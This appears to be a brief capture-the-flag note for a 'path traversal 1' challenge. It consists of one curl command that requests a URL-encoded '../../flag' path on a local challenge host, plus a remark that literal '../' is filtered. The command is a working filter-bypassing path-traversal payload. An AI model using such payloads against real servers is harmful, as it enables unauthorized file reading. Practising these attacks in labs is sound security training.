
* path traversal 1:

`curl -v "http://challenge.localhost:80/package/%2e%2e%2f%2e%2e%2f%66%6c%61%67"`
routes that start with `/package/` are responded
`../` are filtered.

